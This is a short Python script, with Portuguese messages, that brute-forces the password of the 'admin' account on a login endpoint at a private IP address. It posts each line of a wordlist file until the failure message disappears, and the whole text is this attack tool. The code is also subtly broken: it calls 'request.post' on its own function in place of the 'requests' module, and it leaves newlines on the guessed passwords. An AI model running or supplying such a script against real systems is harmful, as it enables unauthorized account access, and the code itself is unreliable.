import requests 
import json



loginUrl = "http://192.168.5.108:9080/login_endpoint.php"

arquivo = "wl.txt"
usuario = "admin"

wordList = open(arquivo, "r")

def request(user, password):
    body = {"user":user, "password":password }
    r = request.post(loginUrl, data = json.dumps(body))
    print(r.text)
    if "Invalid User or Password!" in r.text:
        return False
    else:
        return True

for i in wordList:
    print(i)
    if request(usuario, i) == True:
        print(usuario + "|" + i + "são os registros que estamos procurando")
        break
    
    else:
        print(usuario + "|" + i + "não são validos")

